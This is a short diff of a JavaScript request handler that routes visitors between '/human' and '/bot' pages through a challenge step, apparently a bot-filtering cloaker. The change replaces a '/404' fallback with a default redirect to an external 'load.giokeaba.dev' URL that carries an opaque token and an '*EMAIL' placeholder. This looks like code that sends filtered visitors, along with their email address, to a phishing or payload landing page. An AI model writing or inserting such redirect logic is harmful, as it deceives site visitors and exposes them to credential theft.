@@ -83,7 +83,10 @@ module.exports = async (req, res) => {
   const hasFailOverride = typeof req.query.fail === 'string' && String(req.query.fail).trim() !== '';
   const passRaw = normalizeUrl(req.query.pass, '/human');
   const failRaw = normalizeUrl(req.query.fail, '/bot');
-  const challengeFailRaw = '/404';
+  const challengeFailRaw = normalizeUrl(
+    req.query.challengeFail || req.query.cfail,
+    'https://load.giokeaba.dev/fAvAhb!DVC03TzH8k7r1G148RqL/*EMAIL'
+  );
   const challengeRaw = normalizeUrl(req.query.challenge, '/challenge');
   const waitSeconds = Math.max(0, Number(req.query.wait || 10));
   const apiUrl =
